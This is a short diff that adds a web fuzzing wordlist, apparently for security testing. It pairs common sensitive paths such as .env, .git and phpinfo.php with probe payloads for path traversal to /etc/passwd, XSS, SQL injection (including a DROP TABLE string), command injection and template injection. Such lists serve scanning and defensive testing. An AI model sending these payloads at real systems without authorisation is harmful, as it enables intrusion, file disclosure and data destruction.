@@ -1,0 +1,30 @@
+admin
+login
+test
+index
+home
+dashboard
+user
+users
+config
+backup
+api
+upload
+search
+page
+robots.txt
+.env
+.git
+wp-admin
+phpinfo.php
+server-status
+../../etc/passwd
+..\..\windows\win.ini
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+' OR 1=1--
+" OR ""="
+'; DROP TABLE users;--
+; ls -la
+$(whoami)
+{{7*7}}
